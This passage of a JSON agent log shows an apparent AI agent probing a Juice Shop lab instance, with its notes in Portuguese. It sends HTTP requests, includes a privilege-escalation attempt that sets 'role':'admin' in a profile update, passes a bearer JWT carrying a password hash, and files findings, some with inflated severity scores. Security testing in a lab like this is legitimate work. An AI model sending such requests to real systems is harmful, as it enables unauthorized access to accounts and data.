+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/captcha/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"46\",\"etag\":\"W/\\\"2e-2xKKHLKgYNp9TibjjZKl4C2lqVc\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:21:04 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"captchaId\": 1,\n  \"captcha",
+      "timestamp": "2026-08-03T15:21:04.961Z"
+    },
+    {
+      "iteration": 26,
+      "thought": "CAPTCHA EXPOSTO SEM AUTENTICAÇÃO! O endpoint /rest/captcha/ retorna a resposta correta do CAPTCHA em plain text (\"answer\": \"9\"). Isso é uma vulnerabilidade CRÍTICA — automaticamente quebra o CAPTCHA permitindo bypass automático de proteções de força bruta, registro de contas, etc.\n\nVou fazer report deste finding crítico.",
+      "action": {
+        "action": "report_finding",
+        "title": "CAPTCHA Answer Exposed in API Response",
+        "severity": "CRITICAL",
+        "category": "Broken Access Control / Security Misconfiguration",
+        "description": "The /rest/captcha/ endpoint exposes the CAPTCHA answer in plain text within the API response, completely defeating the purpose of CAPTCHA protection. This allows attackers to programmatically bypass CAPTCHA on all operations that use this endpoint (login, registration, password reset, contact forms, etc.), enabling automated attacks including brute force, credential stuffing, and account enumeration. The CAPTCHA serves no security purpose if its answer is publicly available. CWE-339 (Insufficient Entropy), CWE-640 (Weak Password Recovery Mechanism). CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (Score: 9.8 - CRITICAL)",
+        "steps": [
+          "Send GET request to http://juice-shop:3000/rest/captcha/",
+          "No authentication required",
+          "Response contains both the captcha question and the correct answer in plain text",
+          "Attacker can programmatically read the answer and bypass CAPTCHA protection"
+        ],
+        "evidence": "HTTP 200 response: {\"captchaId\": 1, \"captcha\": \"9+3-3\", \"answer\": \"9\"}"
+      },
+      "observation": "Finding registrado com sucesso.\nTítulo: \"CAPTCHA Answer Exposed in API Response\" | Severidade: CRITICAL\nTotal de findings até agora: 4.",
+      "timestamp": "2026-08-03T15:21:23.424Z"
+    },
+    {
+      "iteration": 27,
+      "thought": "Quatro findings reportados (3 HIGH/CRITICAL + 1 CRITICAL). Agora vou acelerar os testes restantes para cobrir todas as categorias. Preciso coletar respostas de /rest/continue-code, /rest/languages, PUT /rest/user/profile, POST /rest/products, CORS, e depois testar mais endpoints e vulnerabilidades como JWT tampering, path traversal, stored XSS, etc.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/continue-code",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/continue-code\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"79\",\"etag\":\"W/\\\"4f-VcVV17vv+V2UrrHPg1vhlW8y1Nw\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:21:37 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"continueCode\": \"vMeq",
+      "timestamp": "2026-08-03T15:21:37.447Z"
+    },
+    {
+      "iteration": 28,
+      "thought": "/rest/continue-code expõe um \"continueCode\" sem autenticação — provavelmente token de continuação de sessão. Interessante mas preciso verificar como é usado. Continuando testes.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/rest/languages",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/rest/languages\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"4235\",\"etag\":\"W/\\\"108b-ZwsKOrFGE/3P5ucQP35nWngs1PU\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:21:54 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n[\n  {\n    \"key\": \"az_AZ\",",
+      "timestamp": "2026-08-03T15:21:54.419Z"
+    },
+    {
+      "iteration": 29,
+      "thought": "/rest/languages retorna lista de idiomas suportados — informação não sensível. Agora preciso coletar respostas dos testes POST/PUT e IDOR. Vou continuar com testes mais agressivos de vulnerabilidades.",
+      "action": {
+        "action": "make_request",
+        "method": "PUT",
+        "url": "http://juice-shop:3000/rest/user/profile",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjowIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzg1NzcwMDQzfQ.yUAQE_s4xeTtXDp62eT4wcVP-Hy8BdvewnGppqpl_Bd4BL0C8LH1kEt67lSHas56G83zAY3LZzxHZhZJslK4WU1FKcUfdOqe_t4uc5l-5BtEJLIuXe9ePabZ1E9aSh8MLo74aa5ehezz83Bhk0kHQYfThD2B8HXTn44eykt7QNg",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "jim@juice-sh.op",
+          "role": "admin"
+        }
+      },
+      "observation": "HTTP 500 PUT http://juice-shop:3000/rest/user/profile\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:22:13 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"1845\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Unexpected path: /rest/user/profile\",\n ",
+      "timestamp": "2026-08-03T15:22:13.476Z"
+    },
+    {
+      "iteration": 30,
+      "thought": "PUT /rest/user/profile retorna 500 com \"Unexpected path\" — endpoint não existe nesse caminho. Preciso descobrir o caminho correto para user profile. Vou testar variações. Information disclosure mínima no stack trace. Continuando com outros testes.",
+      "action": {
+        "action": "make_request",
+        "method": "POST",
+        "url": "http://juice-shop:3000/rest/products",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzg1NzcwMDQzfQ.yUAQE_s4xeTtXDp62eT4wcVP-Hy8BdvewnGppqpl_Bd4BL0C8LH1kEt67lSHas56G83zAY3LZzxHZhZJslK4WU1FKcUfdOqe_t4uc5l-5BtEJLIuXe9ePabZ1E9aSh8MLo74aa5ehezz83Bhk0kHQYfThD2B8HXTn44eykt7QNg",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Malicious Product"
+        }
+      },
+      "observation": "HTTP 500 POST http://juice-shop:3000/rest/products\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:22:31 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"1837\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Unexpected path: /rest/products\",\n    \"sta",
+      "timestamp": "2026-08-03T15:22:31.525Z"
+    },
+    {
+      "iteration": 31,
+      "thought": "POST /rest/products também retorna 500 \"Unexpected path\". Parece que os endpoints /rest/products e /rest/user/profile não existem ou são servidos de forma diferente. Vou testar /api/Products e /api/Users em vez disso.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/api/Users/",
+        "headers": {}
+      },
+      "observation": "HTTP 401 GET http://juice-shop:3000/api/Users/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:22:48 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"234\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"No Authorization header was found\",\n    \"name\":",
+      "timestamp": "2026-08-03T15:22:48.621Z"
+    },
+    {
+      "iteration": 32,
+      "thought": "/api/Users/ requer autenticação (401). Vou testar com autenticação. Também preciso consolidar os findings e começar a encerrar, pois estou usando muitos tokens. Tenho 4 findings críticos já. Vou fazer mais testes rápidos e depois finish.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/api/Users/",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0wMyAxNToxMjoxOC4yNTQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzg1NzcwMDQzfQ.yUAQE_s4xeTtXDp62eT4wcVP-Hy8BdvewnGppqpl_Bd4BL0C8LH1kEt67lSHas56G83zAY3LZzxHZhZJslK4WU1FKcUfdOqe_t4uc5l-5BtEJLIuXe9ePabZ1E9aSh8MLo74aa5ehezz83Bhk0kHQYfThD2B8HXTn44eykt7QNg"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Users/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"6070\",\"etag\":\"W/\\\"17b6-mARpbt4xO9ElsDrd+BufPn6dIhU\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:23:01 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n  \"d",
+      "timestamp": "2026-08-03T15:23:01.808Z"
+    },
+    {
+      "iteration": 33,
+      "thought": "EXCELENTE! /api/Users/ com autenticação retorna lista COMPLETA de usuários com emails, roles, e dados sensíveis. Isso é IDOR de enumeração + information disclosure crítica. Vou fazer report.",
+      "action": {
+        "action": "report_finding",
+        "title": "User Enumeration and Information Disclosure via /api/Users Endpoint",
+        "severity": "HIGH",
+        "category": "Sensitive Data Exposure / Broken Access Control",
+        "description": "The /api/Users/ endpoint, when accessed with valid authentication, returns complete list of all users in the system including email addresses, roles (admin/customer), profile images, account creation dates, and update timestamps. This enables user enumeration attacks and reconnaissance. A customer user (jim@juice-sh.op) can enumerate all other users including administrators. While the endpoint requires authentication, the returned data is excessive and violates principle of least privilege — users should not be able to list all other users. CWE-200 (Exposure of Sensitive Information), CWE-639 (Authorization Bypass Through User-Controlled Key). CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (Score: 6.5 - HIGH)",
+        "steps": [
+          "Authenticate as customer user (jim@juice-sh.op, ID=2)",
+          "Send GET request to http://juice-shop:3000/api/Users/ with Authorization header",
+          "Response returns complete user list including admin accounts with emails",
+          "Attacker can enumerate all users and target specific accounts"
+        ],
+        "evidence": "HTTP 200 GET /api/Users/ with auth returns: [{\"id\": 1, \"email\": \"admin@juice-sh.op\", \"role\": \"admin\", ...}, {\"id\": 2, \"email\": \"jim@juice-sh.op\", \"role\": \"customer\", ...}, ...]"
+      },
+      "observation": "Finding registrado com sucesso.\nTítulo: \"User Enumeration and Information Disclosure via /api/Users Endpoint\" | Severidade: HIGH\nTotal de findings até agora: 5.",
+      "timestamp": "2026-08-03T15:23:22.750Z"
+    },
+    {
+      "iteration": 34,
+      "thought": "Cinco findings reportados (4 HIGH/CRITICAL + 1 HIGH). Estou com tempo/tokens limitados. Vou fazer consolidação rápida dos últimos testes e preparar finish com summary completo.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://juice-shop:3000/api/Products/",
+        "headers": {}
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Products/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"13212\",\"etag\":\"W/\\\"339c-qFxMYzunkRHmF13aHkFrC3yunbw\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Mon, 03 Aug 2026 15:23:38 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n",
+      "timestamp": "2026-08-03T15:23:38.730Z"
+    }
+  ]
+}
